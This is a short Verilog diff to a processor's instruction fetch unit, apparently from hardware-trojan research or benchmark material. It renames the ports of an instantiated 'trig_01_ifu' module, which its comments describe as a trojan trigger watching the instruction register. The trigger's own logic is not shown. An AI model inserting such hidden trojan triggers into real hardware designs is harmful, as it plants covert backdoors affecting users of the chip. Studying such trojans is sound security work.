@@ -145,10 +145,12 @@ module e203_ifu(
   //monitor the ifu instruction register
   //1 when triggered
   //////////////////////////////////////////
+  reg trig_01_en;
+  wire trig_01_o;
   trig_01_ifu u_trig_01_ifu(
     .ifu_o_ir (ifu_o_ir),// The instruction register
-    .trojan_en (trojan_en),//low active
-    .trig_01_ifu_o (trig_01_ifu_o),//high when trojan triggered
+    .trig_01_en (trig_01_en),//low active
+    .trig_01_o (trig_01_o),//high when trojan triggered
     .clk (clk),
     .rst_n (rst_n)
     );
